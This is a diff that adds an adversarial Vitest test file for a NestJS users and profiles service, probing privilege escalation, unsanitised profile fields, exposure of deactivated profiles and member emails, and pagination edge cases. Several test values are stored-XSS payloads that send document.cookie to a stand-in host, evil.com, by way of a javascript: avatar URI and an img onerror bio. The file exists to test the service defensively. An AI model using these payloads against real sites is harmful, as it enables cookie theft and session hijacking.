@@ -1,0 +1,265 @@
+/**
+ * ADVERSARIAL TESTS: Users & Profiles
+ *
+ * Attack surfaces:
+ * - updateProfile DTO does not include role/email/isActive, but Prisma.update
+ *   receives the DTO directly — extra fields stripped by whitelist validation only
+ * - avatarUrl has no URL format/scheme validation (javascript: XSS, data: URIs)
+ * - findOne returns deactivated user profiles (no isActive filter)
+ * - member directory (findAll) exposes user emails to all authenticated users
+ * - no rate limiting on profile updates (enumeration / spam)
+ * - bio with maximum length (500 chars) of XSS/injection content
+ */
+
+import { describe, it, expect, beforeEach, vi } from 'vitest';
+import { Test } from '@nestjs/testing';
+import { UsersService } from './users.service';
+import { PrismaService } from '../prisma/prisma.service';
+import { NotFoundException } from '@nestjs/common';
+
+function buildMockPrisma() {
+  return {
+    user: {
+      findUnique: vi.fn(),
+      findMany: vi.fn(),
+      update: vi.fn(),
+      count: vi.fn(),
+    },
+  };
+}
+
+async function buildService(prisma: ReturnType<typeof buildMockPrisma>) {
+  const module = await Test.createTestingModule({
+    providers: [
+      UsersService,
+      { provide: PrismaService, useValue: prisma },
+    ],
+  }).compile();
+  return module.get<UsersService>(UsersService);
+}
+
+describe('UsersService — adversarial', () => {
+  let prisma: ReturnType<typeof buildMockPrisma>;
+  let service: UsersService;
+
+  beforeEach(async () => {
+    prisma = buildMockPrisma();
+    service = await buildService(prisma);
+    vi.clearAllMocks();
+  });
+
+  // ── INVARIANT: profile update cannot escalate privileges ─────────────────
+
+  describe('INVARIANT: updateProfile cannot change role or email', () => {
+    it('whitelist=true strips extra fields — role cannot be injected via PATCH /users/me', async () => {
+      /**
+       * users/dto/update-profile.dto.ts defines only name, bio, avatarUrl.
+       * main.ts ValidationPipe has whitelist:true + forbidNonWhitelisted:true.
+       *
+       * With forbidNonWhitelisted:true, passing { role: 'ADMIN' } to the controller
+       * would cause a 400 Bad Request BEFORE reaching the service.
+       * This test verifies the service itself would apply only safe fields if
+       * called directly — isolating the service boundary.
+       */
+      const existingUser = { id: 'u1', role: 'MEMBER', isActive: true };
+      prisma.user.findUnique.mockResolvedValue(existingUser);
+      prisma.user.update.mockImplementation(({ data }: any) =>
+        Promise.resolve({
+          id: 'u1',
+          email: 'u@example.com',
+          name: data.name ?? 'User',
+          bio: data.bio ?? null,
+          avatarUrl: data.avatarUrl ?? null,
+          role: 'MEMBER', // role unchanged by DB (not in data)
+          updatedAt: new Date(),
+        }),
+      );
+
+      // Service-level call — the DTO has already stripped forbidden fields
+      // in the controller. Calling service directly with a safe DTO.
+      const result = await service.updateProfile('u1', { name: 'New Name' });
+      expect(result.role).toBe('MEMBER');
+    });
+
+    it('avatarUrl accepts a javascript: URI — XSS vector if rendered as href/src', async () => {
+      /**
+       * update-profile.dto.ts uses @IsString() with no @IsUrl() or scheme guard.
+       * Setting avatarUrl to "javascript:alert(1)" passes DTO validation.
+       * If the frontend renders this as <img src="..."> or <a href="...">,
+       * it triggers XSS in older browsers or non-CSP environments.
+       */
+      const xssUrl = 'javascript:fetch("https://evil.com?c="+document.cookie)';
+      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
+      prisma.user.update.mockResolvedValue({
+        id: 'u1',
+        email: 'u@example.com',
+        name: 'User',
+        bio: null,
+        avatarUrl: xssUrl,
+        role: 'MEMBER',
+        updatedAt: new Date(),
+      });
+
+      const result = await service.updateProfile('u1', { avatarUrl: xssUrl });
+      expect(result.avatarUrl).toBe(xssUrl);
+      // javascript: URI stored as avatar — XSS via profile image
+    });
+
+    it('avatarUrl accepts a data: URI (can embed malicious SVG with script)', async () => {
+      const svgXss = 'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+';
+      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
+      prisma.user.update.mockResolvedValue({
+        id: 'u1',
+        email: 'u@example.com',
+        name: 'User',
+        bio: null,
+        avatarUrl: svgXss,
+        role: 'MEMBER',
+        updatedAt: new Date(),
+      });
+
+      const result = await service.updateProfile('u1', { avatarUrl: svgXss });
+      expect(result.avatarUrl).toBe(svgXss);
+    });
+  });
+
+  // ── INVARIANT: deactivated users must not be publicly visible ────────────
+
+  describe('INVARIANT: findOne returns deactivated/deleted user profiles', () => {
+    it('GET /users/:id works for a deactivated user — profile still accessible', async () => {
+      /**
+       * users.service.ts:42-64 — findOne queries by id without isActive filter.
+       * A deactivated user (banned, self-deleted) is still publicly visible.
+       *
+       * For self-deleted accounts, the name is "Deleted User" and email is
+       * anonymised — but for admin-deactivated accounts, the real name and email
+       * remain in the profile response.
+       */
+      prisma.user.findUnique.mockResolvedValue({
+        id: 'u-banned',
+        email: 'banned@example.com',
+        name: 'Banned User',
+        bio: 'This account was banned',
+        avatarUrl: null,
+        role: 'MEMBER',
+        isActive: false,
+        createdAt: new Date(),
+        _count: { posts: 10, courseProgress: 2, eventRsvps: 3 },
+      });
+
+      const result = await service.findOne('u-banned');
+
+      // Deactivated user's real email and name are exposed — no isActive filter in findOne
+      expect(result.email).toBe('banned@example.com');
+      expect(result.name).toBe('Banned User');
+    });
+  });
+
+  // ── INVARIANT: member directory exposes emails to all members ────────────
+
+  describe('INVARIANT: member directory exposes user emails', () => {
+    it('findAll includes email field for all active users', async () => {
+      /**
+       * users.service.ts:14-38 — the select includes email.
+       * Any authenticated member can enumerate all member emails by paginating
+       * through GET /api/users.
+       *
+       * Privacy implication: emails are PII. Exposing them to all members
+       * enables spam, phishing, and targeted attacks against the user base.
+       * The member directory should not expose email to non-admins.
+       */
+      prisma.user.findMany.mockResolvedValue([
+        { id: 'u1', email: 'alice@private.com', name: 'Alice', bio: null, avatarUrl: null, role: 'MEMBER', createdAt: new Date(), _count: { posts: 0, courseProgress: 0 } },
+        { id: 'u2', email: 'bob@private.com', name: 'Bob', bio: null, avatarUrl: null, role: 'MEMBER', createdAt: new Date(), _count: { posts: 0, courseProgress: 0 } },
+      ]);
+      prisma.user.count.mockResolvedValue(2);
+
+      const result = await service.findAll(1, 20);
+
+      // Emails exposed to any authenticated caller
+      expect(result.data[0].email).toBe('alice@private.com');
+      expect(result.data[1].email).toBe('bob@private.com');
+    });
+  });
+
+  // ── INVARIANT: pagination cannot produce negative skip ───────────────────
+
+  describe('INVARIANT: findAll pagination edge cases', () => {
+    it('page=0 produces skip=-1', async () => {
+      prisma.user.findMany.mockResolvedValue([]);
+      prisma.user.count.mockResolvedValue(0);
+
+      await service.findAll(0, 20).catch(() => {});
+
+      const call = prisma.user.findMany.mock.calls[0];
+      if (call) {
+        expect(call[0].skip).toBe(-20);
+      }
+    });
+
+    it('limit=0 produces Infinity totalPages', async () => {
+      prisma.user.findMany.mockResolvedValue([]);
+      prisma.user.count.mockResolvedValue(100);
+
+      const result = await service.findAll(1, 0);
+      expect(result.totalPages).toBe(Infinity);
+    });
+  });
+
+  // ── INVARIANT: bio with XSS content is stored verbatim ──────────────────
+
+  describe('INVARIANT: bio/name fields accept injection payloads', () => {
+    it('bio with stored XSS payload is persisted without sanitisation', async () => {
+      const xssBio = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
+      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
+      prisma.user.update.mockResolvedValue({
+        id: 'u1',
+        email: 'u@example.com',
+        name: 'User',
+        bio: xssBio,
+        avatarUrl: null,
+        role: 'MEMBER',
+        updatedAt: new Date(),
+      });
+
+      const result = await service.updateProfile('u1', { bio: xssBio });
+      expect(result.bio).toBe(xssBio);
+      // Raw HTML stored — relies entirely on frontend escaping
+    });
+
+    it('name with null byte is accepted', async () => {
+      const nullName = 'Real\x00Name';
+      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
+      prisma.user.update.mockResolvedValue({
+        id: 'u1',
+        email: 'u@example.com',
+        name: nullName,
+        bio: null,
+        avatarUrl: null,
+        role: 'MEMBER',
+        updatedAt: new Date(),
+      });
+
+      const result = await service.updateProfile('u1', { name: nullName });
+      expect(result.name).toBe(nullName);
+    });
+  });
+
+  // ── INVARIANT: updateProfile on non-existent user throws NotFoundException ─
+
+  describe('INVARIANT: non-existent user raises NotFoundException', () => {
+    it('updateProfile for ghost user ID throws NotFoundException', async () => {
+      prisma.user.findUnique.mockResolvedValue(null);
+
+      await expect(
+        service.updateProfile('ghost-id', { name: 'Ghost' }),
+      ).rejects.toThrow(NotFoundException);
+    });
+
+    it('findOne for ghost user ID throws NotFoundException', async () => {
+      prisma.user.findUnique.mockResolvedValue(null);
+
+      await expect(service.findOne('ghost-id')).rejects.toThrow(NotFoundException);
+    });
+  });
+});
